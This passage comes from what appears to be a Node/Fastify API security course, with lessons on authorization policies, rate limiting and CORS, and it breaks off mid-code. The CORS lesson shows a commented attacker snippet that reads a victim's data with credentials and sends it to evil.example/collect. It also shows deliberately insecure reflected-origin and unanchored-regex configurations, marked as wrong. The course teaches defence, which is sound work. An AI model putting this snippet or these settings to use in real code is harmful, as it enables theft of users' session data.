    → most Node apps keep it in the query.

    know it exists before deciding you cannot
    use it.`,
      codeExample: {
        title: "Policies you can test, and layers that fail independently",
        code: `// ── policies/post.js ────────────────────────────────────────
// One user, one action, one resource. No HTTP, no database.
export const postPolicy = {
  view(user, post) {
    if (post.deletedAt) return false;
    if (post.userId === user.id) return true;
    if (post.published) return true;
    return user.permissions.has("posts.read.all");
  },

  update(user, post) {
    if (post.deletedAt) return false;
    if (post.locked) return false;              // nobody, not even the owner
    if (post.userId === user.id) return true;
    return user.permissions.has("posts.update.all");
  },

  delete(user, post) {
    if (post.userId === user.id) return true;
    return user.permissions.has("posts.delete.all");
  },

  publish(user, post) {
    if (post.userId !== user.id) return false;
    if (post.embargoUntil && post.embargoUntil > new Date()) return false;
    return user.permissions.has("posts.publish");
  },
};
// Read that as documentation. Every rule about a post is on
// one screen, which is a claim no codebase with the same
// rules spread across eight handlers can make.


// ── Testing it, which is the real payoff ────────────────────
import { test } from "node:test";
import assert from "node:assert/strict";

const owner = { id: 1, permissions: new Set() };
const other = { id: 2, permissions: new Set() };
const admin = { id: 3, permissions: new Set(["posts.update.all"]) };

test("post update policy", () => {
  const post = { userId: 1, locked: false, deletedAt: null };

  assert.equal(postPolicy.update(owner, post), true);
  assert.equal(postPolicy.update(other, post), false);
  assert.equal(postPolicy.update(admin, post), true);

  // Locked beats everything, including admin. That is a
  // decision, and now it is a decision with a test.
  assert.equal(postPolicy.update(owner, { ...post, locked: true }), false);
  assert.equal(postPolicy.update(admin, { ...post, locked: true }), false);

  assert.equal(postPolicy.update(owner, { ...post, deletedAt: new Date() }), false);
});
// Six meaningful assertions, no server, no database, no
// fixtures, milliseconds. The same coverage through inject()
// would be six requests and two users to create first, so in
// practice it does not get written.


// ── Using both layers on one route ──────────────────────────
app.patch("/posts/:id", {
  preHandler: [authenticate, app.requirePermission("posts.update")],
  schema: {
    params: z.object({ id: z.coerce.number().int().positive() }),
    body: updatePostSchema,
    response: { 200: postResponseSchema, 403: errorSchema, 404: errorSchema },
  },
}, async (request, reply) => {
  // Layer 1: the query narrows to rows this caller could
  // possibly touch. Own posts, or any post if they have the
  // broad permission.
  const scope = request.permissions.has("posts.update.all")
    ? eq(posts.id, request.params.id)
    : and(eq(posts.id, request.params.id), eq(posts.userId, request.user.id));

  const [post] = await db.select().from(posts).where(scope);
  if (!post) return reply.code(404).send({ error: "Not found" });

  // Layer 2: the policy decides this specific action. Here a
  // 403 is right, because the caller reached the row through
  // the scope, so they already know it exists.
  if (!postPolicy.update(request.user, post)) {
    return reply.code(403).send({ error: "Forbidden" });
  }

  const [updated] = await db.update(posts)
    .set({ title: request.body.title, body: request.body.body })
    .where(scope)                    // Layer 1 again on the write
    .returning();

  return updated;
});
//
// Note the 403 here versus the 404 in the last lesson. The
// difference is whether the caller was allowed to learn the
// row exists. Reached through the scope: 403 is honest and
// leaks nothing new. Not in the scope at all: 404.


// ── Layer 3: the database, which no bug can talk past ───────
// migrations/0007_post_constraints.sql
ALTER TABLE posts
  ADD CONSTRAINT posts_user_fk
  FOREIGN KEY (user_id) REFERENCES users(id);

ALTER TABLE posts
  ADD CONSTRAINT posts_published_needs_title
  CHECK (published = false OR (title IS NOT NULL AND length(title) > 0));

-- And the one that stops an entire class of confusion:
ALTER TABLE comments
  ADD CONSTRAINT comments_post_fk
  FOREIGN KEY (post_id) REFERENCES posts(id) ON DELETE CASCADE;
--
-- These hold against your API, a migration, a cron job, an
-- admin script and the next service somebody writes. No
-- application check can say that, which is the whole
-- argument for putting a guarantee here when you can.


// ── Layer 4: the response schema, already earning its keep ──
const postResponseSchema = z.object({
  id: z.number(),
  title: z.string(),
  body: z.string(),
  published: z.boolean(),
  createdAt: z.iso.datetime(),
});
// Day 16 verified this strips undeclared fields. So even if
// a broken query returned somebody else's row with an
// internalNotes column on it, that column does not leave the
// process. It is not the check you rely on, and it is the one
// that limits the damage when the others are wrong.


// ── Row-level security, for completeness ────────────────────
// ALTER TABLE posts ENABLE ROW LEVEL SECURITY;
//
// CREATE POLICY posts_owner ON posts
//   USING (user_id = current_setting('app.user_id')::int);
//
// Then every query on posts, from anywhere, sees only that
// user's rows. A forgotten WHERE clause is no longer a
// vulnerability, which is a genuinely different level of
// guarantee.
//
// The cost is that the connection must carry the identity:
//
//   await client.query("SET LOCAL app.user_id = $1", [userId]);
//
// and SET LOCAL is transaction-scoped, so with a pool you
// need a transaction per request and must be certain a
// connection never carries one user's setting into another
// user's query. That is why most Node applications keep the
// check in the query instead. Worth knowing it exists before
// deciding against it.


// ── ⚠ The failure mode of layers ────────────────────────────
// Layers only help if they are INDEPENDENT. This is not:
//
//   const post = await getPost(id, request.user.id);   // scope
//   if (!postPolicy.view(request.user, post)) { ... }  // policy
//
// where getPost already applied the ownership filter and the
// policy re-checks the same condition. Two calls, one actual
// control, and a false sense of two.
//
// Independent means each layer catches a DIFFERENT mistake:
//   the scope catches a forgotten policy call
//   the policy catches a scope that is too wide
//   the constraint catches both
//   the response schema catches the consequences`,
      },
      keyTakeaways: [
        "ABAC shifts the question from \"is this user an admin?\" to \"do these attributes satisfy the policy?\", which matters because most real rules involve the resource.",
        "A policy is a named function taking one user, one action and one resource, so every rule about a resource lives on one screen.",
        "The real payoff is that a policy is testable without HTTP: twenty combinations in twenty lines instead of twenty `inject` calls.",
        "A policy needs the row loaded, which is fine for one record and unusable for a list.",
        "So the division is: the query narrows to what the caller could possibly touch, and the policy decides the specific action.",
        "Use 403 when the caller reached the row through their scope and already knows it exists, and 404 when it was never in scope.",
        "Defense in depth works because the layers fail independently: the scope catches a forgotten policy call, the response schema catches a wrong query.",
        "Day 16's verified response-schema stripping is what limits the damage when an authorization layer is wrong.",
        "The skipped layer is the database. A foreign key or `CHECK` constraint holds against migrations, admin scripts and the next service, which no application check can claim.",
        "PostgreSQL row-level security is the strongest version, and it needs the connection to carry the user identity, which pooling makes awkward.",
        "Layers that re-check the same condition are one control with a false sense of two. Independence is the requirement.",
      ],
      commonMistakes: [
        "Expressing a resource-dependent rule as a role, then adding a role per exception.",
        "Scattering the same authorization rule across eight handlers, so nobody can state the rule without reading all eight.",
        "Only testing authorization through HTTP, which is why the twenty-combination coverage never gets written.",
        "Using a policy for a list endpoint, which means loading rows to decide whether you may load them.",
        "Returning 403 for a resource that was never in the caller's scope, leaking that it exists.",
        "Adding layers that check the same condition twice and calling it defense in depth.",
        "Leaving every guarantee in application code, so a migration or an admin script can violate all of them.",
        "Dismissing row-level security without knowing what it does, or adopting it without noticing the pooling problem.",
      ],
      quiz: [
        {
          question: "Why can't \"an editor may publish a post in a section they own, before the embargo, unless locked\" be a role?",
          options: [
            "Roles cannot be combined",
            "Three of the four conditions are properties of the post, so the decision needs the resource, not just the user",
            "Editors cannot publish",
            "It needs ABAC syntax",
          ],
          correctIndex: 1,
          explanation:
            "That is the shift from asking about the user to asking whether the attributes satisfy the policy.",
        },
        {
          question: "What is the main practical payoff of extracting a policy function?",
          options: [
            "Performance",
            "It is testable without HTTP, so twenty combinations take twenty lines instead of twenty requests, which means the coverage actually gets written",
            "It reduces database queries",
            "It generates documentation",
          ],
          correctIndex: 1,
          explanation:
            "And every rule about the resource ends up on one screen, which no codebase with the rules across eight handlers can claim.",
        },
        {
          question: "Why keep ownership in the query rather than moving everything into policies?",
          options: [
            "Policies are slow",
            "A policy needs the row loaded, so it cannot scope a list. The query narrows what is reachable; the policy decides the action.",
            "Queries are more secure",
            "Policies cannot express ownership",
          ],
          correctIndex: 1,
          explanation:
            "Using a policy for a list means loading rows in order to decide whether you may load them.",
        },
        {
          question: "What makes defense in depth actually work?",
          options: [
            "The number of layers",
            "That the layers fail independently, so each one catches a different mistake",
            "Checking the same rule twice",
            "Putting everything in middleware",
          ],
          correctIndex: 1,
          explanation:
            "Two calls that re-check the same condition are one control with a false sense of two.",
        },
        {
          question: "Why is a database constraint a different kind of guarantee?",
          options: [
            "It is faster",
            "It holds against migrations, admin scripts and other services, which no application-layer check can claim",
            "It is easier to write",
            "It generates better errors",
          ],
          correctIndex: 1,
          explanation:
            "Day 17's point: not everything that touches your data goes through your API.",
        },
      ],
    },
    {
      id: "rate-limiting",
      title: "Rate limiting",
      durationMinutes: 11,
      explanation:
        "## Rate limiting\n\n<b>Rate limiting</b> (restricting how many requests a client may make in a period).\n\n```text\n100 requests / minute → exceeded → 429 Too Many Requests\n```\n\nVerified with `@fastify/rate-limit` at `max: 2`:\n\n```text\nrequest 1  →  200  x-ratelimit-remaining: 1\nrequest 2  →  200  x-ratelimit-remaining: 0\nrequest 3  →  429  retry-after: 60\n              {\"statusCode\":429,\"error\":\"Too Many Requests\",\n               \"message\":\"Rate limit exceeded, retry in 1 minute\"}\n```\n\n> The `Retry-After` header is the part worth noticing. A 429 without it tells a client only that it failed, so a badly written client retries immediately and makes things worse. With it, the client knows exactly how long to wait, which turns a rate limit from a wall into a protocol.\n\nIt protects against brute-force login, credential stuffing, scraping, API abuse and accidental traffic spikes, which are more common than attacks.\n\n---\n\n## Why this is not optional\n\n> Day 18 measured the asymmetry: hashing a password at cost 12 took 216ms on a four-thread pool, so an attacker paid nothing to send a login request and you paid 216ms of a scarce thread to reject it. Rate limiting is the only control on that list that <b>caps the input</b> rather than expanding your capacity, and capacity is a race you lose against anyone with a botnet.\n\n---\n\n## What to key on\n\n```text\nIP           unauthenticated endpoints. login, register, reset.\nUser id      authenticated APIs. the meaningful identity.\nEndpoint     expensive routes get their own, tighter budget.\n```\n\n> Neither key alone is enough, and the reasons are opposite. An <b>IP is not a person</b>: an office, a school or a mobile carrier shares one address, so a limit tight enough to stop an attacker locks out a building. A <b>user id is not available</b> on the endpoints that need protecting most, because login is where you do not know who they are yet.\n>\n> So on login, key on <b>both the address and the submitted email</b>. Address alone lets an attacker spread guesses across many accounts from one place; email alone lets anyone lock a specific user out of their own account by hammering it from anywhere. Together, neither works.\n\n---\n\n## The algorithms\n\n```text\nFixed window    simple. bursts at the boundary.\nSliding window  smoother. more state.\nToken bucket    allows a burst, then a steady rate.\nLeaky bucket    drains at a fixed rate.\n```\n\n> You do not need to implement these, and one property is worth knowing. A <b>fixed window</b> allows double the limit across a boundary: 100 requests at 11:59:59 and 100 more at 12:00:00 is 200 in one second, both within their windows. If that matters, you want a sliding window or a token bucket.\n\n---\n\n## Where the counter lives\n\n> This is Day 17's in-memory session bug again, in a new costume. A rate limiter with an in-process counter is <b>per instance</b>, so ten instances behind a load balancer multiply your limit by ten, and the failure is silent: the limit appears to work and permits ten times what you configured.\n>\n> Use Redis for the counter as soon as you run more than one instance. And note the operational consequence: if Redis is unreachable, decide deliberately whether you fail open (accept requests, lose the limit) or fail closed (reject everything, lose the service). Neither is right; the wrong one is choosing by accident.\n\n---\n\n## Two things people get wrong\n\n> <b>Rate limiting is not a substitute for authorization.</b> It slows an attack down; it does not deny it. An IDOR behind a 100-per-minute limit is still an IDOR, and 100 records a minute is a lot of records.\n>\n> <b>Do not rate limit by an untrusted header.</b> Behind a proxy, `request.ip` is the proxy's address unless you configure `trustProxy`, and if you trust `X-Forwarded-For` unconditionally, a client can set it to a different value on every request and bypass your limiter entirely.",
      diagram: `Verified, @fastify/rate-limit max: 2

    request 1  →  200   remaining: 1
    request 2  →  200   remaining: 0
    request 3  →  429   retry-after: 60
                  "Rate limit exceeded,
                   retry in 1 minute"

    ⚠ the Retry-After header is the part that
      matters.

      a 429 without it tells the client only that
      it failed, so a badly written client retries
      IMMEDIATELY and makes things worse.

      with it, the client knows how long to wait.

      → a rate limit becomes a PROTOCOL rather
        than a wall.


Why it is not optional

    Day 18 measured the asymmetry:

      hashing at cost 12   216ms
      thread pool          4

      the attacker pays NOTHING to send a login
      request.
      you pay 216ms of a scarce thread to REJECT
      it.

    rate limiting is the only control that CAPS
    THE INPUT rather than expanding capacity.

    capacity is a race you lose against anyone
    with a botnet.


⚠ What to key on, and why neither alone works

    IP        unauthenticated endpoints
              login · register · reset
    user id   authenticated APIs
    endpoint  expensive routes, tighter budget

    an IP IS NOT A PERSON
      an office, a school, a mobile carrier
      share one address
      → a limit tight enough to stop an attacker
        locks out a building

    a USER ID IS NOT AVAILABLE
      on the endpoints that need it most
      → login is where you do not know who they
        are yet

    so on login, key on BOTH the address AND the
    submitted email:

      address alone → attacker spreads guesses
                      across many accounts from
                      one place
      email alone   → anyone locks a specific user
                      out from anywhere

      together, neither works.


The algorithms, and the one property to know

    fixed window     simple. bursts at boundary.
    sliding window   smoother. more state.
    token bucket     a burst, then steady.
    leaky bucket     drains at a fixed rate.

    ⚠ a FIXED WINDOW allows DOUBLE the limit
      across a boundary:

        100 requests at 11:59:59
        100 more at 12:00:00
        = 200 in one second, both "within" their
          windows

      if that matters: sliding window or token
      bucket.


⚠ Where the counter lives

    Day 17's in-memory session bug, new costume.

    an in-process counter is PER INSTANCE.

      10 instances → your limit is 10× what you
      configured

      and it FAILS SILENTLY: the limit appears to
      work.

    → Redis, as soon as you run more than one
      instance.

    and decide deliberately:
      Redis unreachable → fail OPEN  (accept, lose
                                      the limit)
                        → fail CLOSED (reject, lose
                                       the service)

      neither is right. the wrong one is choosing
      BY ACCIDENT.


⚠ Two things people get wrong

    1. RATE LIMITING IS NOT AUTHORIZATION

       it slows an attack. it does not deny it.

       an IDOR behind a 100/min limit is still an
       IDOR, and 100 records a minute is a lot of
       records.

    2. DO NOT KEY ON AN UNTRUSTED HEADER

       behind a proxy, request.ip is the PROXY
       unless you configure trustProxy

       trust X-Forwarded-For unconditionally and a
       client sets a new value every request,
       bypassing the limiter entirely`,
      codeExample: {
        title: "Limits that hold across instances and cannot be spoofed",
        code: `import Fastify from "fastify";
import rateLimit from "@fastify/rate-limit";
import { createClient } from "redis";

// ── Verified baseline ───────────────────────────────────────
const app = Fastify({
  // ⚠ Behind a load balancer, request.ip is the balancer's
  // address unless you say so. Every client then shares one
  // key and one budget.
  //
  // And do NOT set this to \`true\` on a service reachable
  // directly: it makes Fastify trust X-Forwarded-For from
  // anyone, so a client sends a new value per request and
  // your limiter counts nothing.
  trustProxy: process.env.TRUSTED_PROXY_CIDR ?? false,
});

const redis = createClient({ url: process.env.REDIS_URL });
await redis.connect();

await app.register(rateLimit, {
  max: 100,
  timeWindow: "1 minute",
  redis,
  //     ^^^^^ Day 17's lesson again. Without this the counter
  //     is per instance, so ten pods permit 1,000 per minute
  //     while the config says 100, and nothing tells you.

  // Decide this rather than inherit it.
  skipOnError: true,
  // true  -> Redis down: requests are allowed. You keep
  //          serving and lose the limit.
  // false -> Redis down: requests are rejected. You keep the
  //          limit and lose the service.
  //
  // For a public API, failing open is usually right: an
  // outage of your limiter should not be an outage of your
  // product. For a login endpoint, consider the opposite.

  keyGenerator: (request) => request.user?.id ?? request.ip,
  //                         ^^^^^^^^^^^^^^^^ authenticated
  //                         users get their own budget rather
  //                         than sharing an office's address

  // Give the client something to act on.
  addHeadersOnExceeding: {
    "x-ratelimit-limit": true,
    "x-ratelimit-remaining": true,
    "x-ratelimit-reset": true,
  },
  errorResponseBuilder: (request, context) => ({
    statusCode: 429,
    error: "Too Many Requests",
    message: \`Rate limit exceeded. Retry in \${context.after}.\`,
    retryAfter: context.ttl,
  }),
});
// Verified response shape at max: 2:
//   429, retry-after: 60,
//   {"statusCode":429,"error":"Too Many Requests",
//    "message":"Rate limit exceeded, retry in 1 minute"}


// ── The login limit, keyed on both ──────────────────────────
app.register(async (auth) => {
  await auth.register(rateLimit, {
    max: 5,
    timeWindow: "15 minutes",
    redis,
    keyGenerator: (request) => {
      const email = String(request.body?.email ?? "").toLowerCase();
      return \`login:\${request.ip}:\${email}\`;
    },
    //  Both, and here is why neither alone works:
    //
    //  ip only     an attacker with one address tries five
    //              passwords each against 10,000 accounts.
    //              Well within a per-account limit, and
    //              credential stuffing is exactly this.
    //
    //  email only  anyone sends six wrong passwords for
    //              your@email.com from six addresses and you
    //              cannot log in. A denial of service against
    //              one person, delivered by your own defence.
    //
    //  both        an attacker needs a new address per
    //              account per window, which is the cost you
    //              wanted to impose.
  });

  auth.post("/login", { schema: { body: loginSchema } }, loginHandler);
  auth.post("/register", { schema: { body: registerSchema } }, registerHandler);
  auth.post("/password-reset", { schema: { body: resetSchema } }, resetHandler);
});
//
// ⚠ Also add a per-account counter that survives the window,
// so 5 failures per 15 minutes cannot become 480 per day:
async function recordFailedLogin(db, userId) {
  const [user] = await db.update(users)
    .set({ failedLogins: sql\`\${users.failedLogins} + 1\`,
           lastFailedAt: new Date() })
    .where(eq(users.id, userId))
    .returning({ failedLogins: users.failedLogins });

  if (user.failedLogins >= 20) {
    // Not a lock, which is itself a denial of service. Require
    // a second factor or an emailed confirmation instead.
    await db.update(users).set({ requiresVerification: true })
      .where(eq(users.id, userId));
  }
}


// ── Per-route budgets for expensive work ────────────────────
app.post("/reports/generate", {
  preHandler: authenticate,
  config: { rateLimit: { max: 2, timeWindow: "1 hour" } },
}, generateReportHandler);
// A route that runs for thirty seconds does not belong on the
// same budget as a route that reads one row. Day 18's point
// generalised: anything you deliberately make expensive is
// expensive for you, so it needs its own cap.

app.post("/uploads", {
  preHandler: authenticate,
  config: { rateLimit: { max: 10, timeWindow: "1 hour" } },
  bodyLimit: 5 * 1024 * 1024,
}, uploadHandler);


// ── ⚠ The fixed-window boundary, concretely ─────────────────
// max: 100, timeWindow: "1 minute", fixed window:
//
//   11:59:59.900   100 requests   ✓ window A
//   12:00:00.100   100 requests   ✓ window B
//
//   200 requests in 200ms, and both windows were respected.
//
// If your limit exists to protect a capacity number, that
// burst is the number that matters. A sliding window or token
// bucket costs more state and does not have this hole.


// ── ⚠ What rate limiting does not do ────────────────────────
app.get("/invoices/:id", {
  preHandler: authenticate,
  config: { rateLimit: { max: 100, timeWindow: "1 minute" } },
}, async (request) => {
  const [invoice] = await db.select().from(invoices)
    .where(eq(invoices.id, request.params.id));
  return invoice;
});
//
// Rate limited, authenticated, and still an IDOR. At 100 a
// minute an attacker reads 144,000 invoices a day, politely,
// within your limit, from one account.
//
// Rate limiting bought time. It did not deny anything. The
// ownership predicate is the control; the limit is the
// speed bump.


// ── Watching it ─────────────────────────────────────────────
app.addHook("onResponse", async (request, reply) => {
  if (reply.statusCode === 429) {
    request.log.warn({
      ip: request.ip,
      userId: request.user?.id,
      url: request.url,
    }, "rate limit exceeded");
  }
});
// A sudden rise in 429s on /login is a credential-stuffing
// alert. A steady trickle is usually one badly written
// client, and it is worth knowing which before you tighten
// the limit on everybody.`,
      },
      keyTakeaways: [
        "Verified with `@fastify/rate-limit`: the third request at `max: 2` returned 429 with `retry-after: 60` and `x-ratelimit-*` headers.",
        "`Retry-After` is what turns a limit into a protocol. Without it a badly written client retries immediately and makes things worse.",
        "Rate limiting is the only control that caps the input. Day 18 measured the asymmetry: the attacker pays nothing, you pay 216ms of a scarce thread.",
        "An IP is not a person. An office or a mobile carrier shares one, so a limit tight enough to stop an attacker locks out a building.",
        "A user id is not available on the endpoints that most need protecting, because login is where you do not know who they are.",
        "On login, key on address and submitted email together. Address alone permits credential stuffing; email alone lets anyone lock one user out.",
        "A fixed window allows double the limit across a boundary: 100 at 11:59:59 and 100 at 12:00:00 is 200 in one second.",
        "An in-process counter is per instance, so ten pods permit ten times your configured limit, silently. Use Redis.",
        "Decide deliberately whether the limiter fails open or closed when Redis is unreachable. The wrong answer is choosing by accident.",
        "Rate limiting is not authorization. An IDOR behind a 100-per-minute limit still leaks 144,000 records a day.",
        "Behind a proxy, configure `trustProxy` to a known range. Trusting `X-Forwarded-For` from anyone lets a client bypass the limiter entirely.",
        "Add a per-account failure counter that survives the window, so five per fifteen minutes cannot become hundreds per day.",
      ],
      commonMistakes: [
        "Returning 429 with no `Retry-After`, so clients retry immediately.",
        "An in-memory counter behind a load balancer, which multiplies your limit by the instance count with no warning.",
        "Keying login limits on the IP alone, which permits credential stuffing across thousands of accounts from one address.",
        "Keying on the email alone, which lets anyone lock a specific user out of their account.",
        "Setting `trustProxy: true` on a directly reachable service, letting a client spoof `X-Forwarded-For` per request.",
        "Leaving `request.ip` as the balancer's address, so every client shares one budget.",
        "Treating rate limiting as a fix for a missing authorization check.",
        "Putting an expensive report route on the same budget as a single-row read.",
        "Locking accounts after N failures, which is a denial-of-service tool aimed at your own users. Require a second factor instead.",
        "Never inheriting a decision about limiter failure, so an outage of Redis silently removes every limit or every request.",
      ],
      quiz: [
        {
          question: "Why does the login limit need both the IP and the submitted email?",
          options: [
            "For better logging",
            "IP alone permits credential stuffing across many accounts from one address; email alone lets anyone lock one user out from anywhere",
            "The library requires both",
            "To avoid Redis",
          ],
          correctIndex: 1,
          explanation:
            "Together, an attacker needs a new address per account per window, which is exactly the cost you wanted to impose.",
        },
        {
          question: "What goes wrong with an in-process rate limit counter behind a load balancer?",
          options: [
            "It is slower",
            "The counter is per instance, so ten pods permit ten times your configured limit, and it fails silently",
            "It leaks memory",
            "Nothing, Fastify shares it",
          ],
          correctIndex: 1,
          explanation:
            "Day 17's in-memory session bug in a new costume. The limit appears to work while permitting ten times what you set.",
        },
        {
          question: "What is the hole in a fixed window?",
          options: [
            "It is imprecise by a few requests",
            "It allows double the limit across a boundary: 100 at 11:59:59 and 100 at 12:00:00 is 200 in one second, both within their windows",
            "It cannot use Redis",
            "It ignores the first request",
          ],
          correctIndex: 1,
          explanation:
            "If the limit exists to protect a capacity number, that burst is the number that matters, and a sliding window or token bucket avoids it.",
        },
        {
          question: "Why is `trustProxy: true` dangerous on a directly reachable service?",
          options: [
            "It slows request parsing",
            "Fastify then trusts `X-Forwarded-For` from anyone, so a client sends a new value per request and the limiter counts nothing",
            "It breaks HTTPS",
            "It disables `request.ip`",
          ],
          correctIndex: 1,
          explanation:
            "Set it to your proxy's known range. Left false behind a balancer, every client instead shares one budget.",
        },
        {
          question: "An IDOR sits behind a 100-per-minute limit. Is it mitigated?",
          options: [
            "Yes, the attack is impractical",
            "No. That is 144,000 records a day, politely, within your limit. Rate limiting slows an attack; it does not deny it.",
            "Yes, if you also log 429s",
            "Only with Redis",
          ],
          correctIndex: 1,
          explanation:
            "The ownership predicate is the control. The limit is a speed bump.",
        },
      ],
    },
    {
      id: "cors",
      title: "CORS, and what it does not do",
      durationMinutes: 11,
      explanation:
        "## CORS\n\n<b>CORS (Cross-Origin Resource Sharing)</b> (a browser mechanism controlling which origins may read responses from cross-origin requests).\n\n```text\nFrontend  https://app.example.com\nAPI       https://api.example.com\n```\n\nDifferent origins, so the browser will not let the page read the response unless the API says it may.\n\n---\n\n## What CORS is not\n\n> This is the most consequential misunderstanding in this lesson. CORS is <b>enforced by the browser</b>, and it protects <b>your users' other tabs</b>, not your API.\n>\n> Verified: a request with no `Origin` header, against an API configured with a strict origin allowlist, returned <b>200 with the full body</b>. `curl`, Postman, a script, a server-to-server call and any non-browser client are unaffected, because there is no browser to enforce anything.\n>\n> So \"CORS protects my API from attackers\" is exactly backwards. What CORS actually does is stop `evil.example` running JavaScript in a victim's browser that reads your API using that victim's cookies. Your API's own authentication and authorization are unchanged by it.\n\n---\n\n## The wildcard with credentials\n\n```javascript\nregister(cors, { origin: \"*\", credentials: true });\n```\n\nVerified: Fastify emits both headers happily.\n\n```text\naccess-control-allow-origin:      *\naccess-control-allow-credentials: true\n```\n\n> The browser refuses that combination, which means your <b>server does not error and your frontend breaks</b>. The symptom is a CORS message in the browser console and a request that never delivers its response, with nothing at all in your server logs. That is why this configuration burns an afternoon: the error is in a place you are not looking.\n\n---\n\n## The misconfiguration that is worse\n\n```javascript\nregister(cors, { origin: true, credentials: true });\n```\n\n> `origin: true` means <b>reflect whatever origin asked</b>. Verified: a request from `https://evil.example` came back with `access-control-allow-origin: https://evil.example` and `access-control-allow-credentials: true`.\n>\n> This is worse than the wildcard, and the reason is counterintuitive. The wildcard is at least <b>rejected</b> by the browser when credentials are involved, so it fails loudly and safely. Reflection produces a valid, credentialed CORS response for <b>every</b> origin, so it works perfectly, for the attacker. Any page the victim visits can read your API as them.\n>\n> It is common because it is the setting that makes the console error go away.\n\n---\n\n## An allowlist\n\nVerified with `origin: [\"https://app.example.com\"]`: a request from `https://evil.example` came back with <b>no</b> `access-control-allow-origin` header, and the real origin was echoed correctly.\n\n> Two practical notes. Include every origin you actually use, since a staging domain and a preview deployment are separate origins, and a wildcard subdomain match written as a bad regex is its own vulnerability. And remember that <b>the port and scheme are part of the origin</b>, so `http://localhost:3000` and `http://localhost:5173` are different, which is most local CORS confusion.\n\n---\n\n## Preflight\n\n> A request with a non-simple method or header triggers an `OPTIONS` <b>preflight</b> first, and the browser only sends the real request if the preflight approves it. Two consequences: your `OPTIONS` handling must work, which plugins do for you, and every such request is <b>two round trips</b> unless you set `maxAge` so the browser caches the approval.\n\n---\n\n## And CSRF is a different problem\n\n> CORS does not prevent <b>CSRF</b>, because a CSRF attack does not need to read the response. A cross-site form post that transfers money has done its damage whether or not the attacker can see the result, and CORS only governs reading. Day 18's `SameSite` cookie attribute is the control for that, which is why both lessons exist.",
      diagram: `⚠⚠ CORS protects YOUR USERS' OTHER TABS.
   Not your API.

    verified: a request with NO Origin header,
    against a strict allowlist:

      200, full body

    curl · Postman · a script · server-to-server
      → all unaffected. there is no browser to
        enforce anything.

    "CORS protects my API from attackers" is
    EXACTLY BACKWARDS.

    what it actually does:

      stops evil.example running JavaScript in a
      victim's browser that reads your API using
      THAT VICTIM'S COOKIES

    your API's own authn and authz are unchanged
    by it.


The wildcard with credentials

    origin: "*", credentials: true

    verified, Fastify emits BOTH:

      access-control-allow-origin:      *
      access-control-allow-credentials: true

    the BROWSER refuses that combination.

    → your server does not error
      your frontend breaks

    symptom: a CORS message in the browser
    console, a response that never arrives, and
    NOTHING in your server logs.

    that is why it burns an afternoon: the error
    is somewhere you are not looking.


⚠⚠ The one that is WORSE

    origin: true, credentials: true

    origin: true = REFLECT WHATEVER ASKED

    verified, request from https://evil.example:

      allow-origin      = https://evil.example
      allow-credentials = true

    worse than the wildcard, and the reason is
    counterintuitive:

      the wildcard is REJECTED by the browser
      when credentials are involved
        → it fails LOUDLY and SAFELY

      reflection produces a VALID credentialed
      response for EVERY origin
        → it works perfectly. for the attacker.

      any page the victim visits reads your API
      as them.

    and it is common because it is the setting
    that MAKES THE CONSOLE ERROR GO AWAY.


An allowlist

    origin: ["https://app.example.com"]

    verified:
      evil origin  → no allow-origin header
      good origin  → echoed correctly

    ⚠ two notes:

      include every origin you ACTUALLY use.
      staging and a preview deployment are
      separate origins, and a wildcard-subdomain
      regex written badly is its own hole.

      the PORT and SCHEME are part of the origin.
      http://localhost:3000 ≠ :5173
      → most local CORS confusion


Preflight

    a non-simple method or header triggers an
    OPTIONS preflight FIRST.

    the browser sends the real request only if
    the preflight approves.

    two consequences:
      your OPTIONS handling must work
        (plugins do this)
      every such request is TWO ROUND TRIPS
        unless you set maxAge so the browser
        caches the approval


⚠ And CSRF is a DIFFERENT problem

    CORS does not prevent CSRF, because a CSRF
    attack DOES NOT NEED TO READ THE RESPONSE.

    a cross-site form post that transfers money
    has done its damage whether or not the
    attacker sees the result.

    CORS only governs READING.

    → Day 18's SameSite is the control for that.
      which is why both lessons exist.`,
      codeExample: {
        title: "CORS configured three ways, with the verified results",
        code: `import Fastify from "fastify";
import cors from "@fastify/cors";
// Verified with @fastify/cors 11.3.0


// ── ✗ 1. Wildcard plus credentials ──────────────────────────
const a = Fastify();
await a.register(cors, { origin: "*", credentials: true });

// Request from https://evil.example:
//   access-control-allow-origin      = *
//   access-control-allow-credentials = true
//
// VERIFIED: Fastify sends both. It does not warn.
//
// The browser then refuses the response, because the spec
// forbids a wildcard with credentials. So:
//
//   your server logs      nothing
//   your browser console  a CORS error
//   your frontend         requests that never resolve
//
// Not a security hole, and a genuinely expensive afternoon,
// because you will look at the server first.


// ── ✗✗ 2. Reflection. The real vulnerability. ───────────────
const b = Fastify();
await b.register(cors, { origin: true, credentials: true });

// Request from https://evil.example:
//   access-control-allow-origin      = https://evil.example
//   access-control-allow-credentials = true
//
// VERIFIED. Read it again: your API just told the browser
// that evil.example is allowed to read this response WITH
// the victim's cookies attached.
//
// So any page your logged-in user visits can:
//
//   fetch("https://api.example.com/me", { credentials: "include" })
//     .then(r => r.json())
//     .then(data => fetch("https://evil.example/collect", {
//       method: "POST", body: JSON.stringify(data),
//     }));
//
// and it works. The user's session cookie went along,
// because you said it could.
//
// This is worse than the wildcard specifically BECAUSE it
// works. The wildcard fails safe. Reflection fails open, and
// silently, and it is what people reach for when the
// wildcard's console error annoys them.


// ── ✓ 3. An allowlist ───────────────────────────────────────
const ALLOWED = [
  "https://app.example.com",
  "https://staging.app.example.com",
  ...(process.env.NODE_ENV !== "production"
    ? ["http://localhost:5173", "http://localhost:3000"]
    : []),
];

const c = Fastify();
await c.register(cors, {
  origin: ALLOWED,
  credentials: true,
  methods: ["GET", "POST", "PATCH", "DELETE"],
  allowedHeaders: ["content-type", "authorization"],
  maxAge: 86_400,     // cache the preflight for a day, so a
                      //  PATCH is one round trip and not two
});

// VERIFIED:
//   from https://evil.example       ->  no allow-origin header
//   from https://app.example.com    ->  echoed correctly
//
// ⚠ Note the scheme and port are part of the origin.
// "http://localhost:3000" does not match a request from
// "http://localhost:5173", and neither matches
// "https://localhost:3000". Most local CORS confusion is
// this and nothing more.


// ── ⚠ If you need dynamic origins, be exact ─────────────────
// ✗ A regex that looks fine and is not:
await app.register(cors, {
  origin: /example\\.com$/,      // matches evil-example.com
  credentials: true,             // and notexample.com
});
// The dot is unescaped in the wrong place and there is no
// anchor on the subdomain, so an attacker registers
// "notexample.com" and your allowlist welcomes them.

// ✓ Parse it, do not pattern-match it:
await app.register(cors, {
  credentials: true,
  origin(origin, cb) {
    // No Origin header: a non-browser client. It is not
    // subject to CORS at all, so there is nothing to allow
    // or deny here.
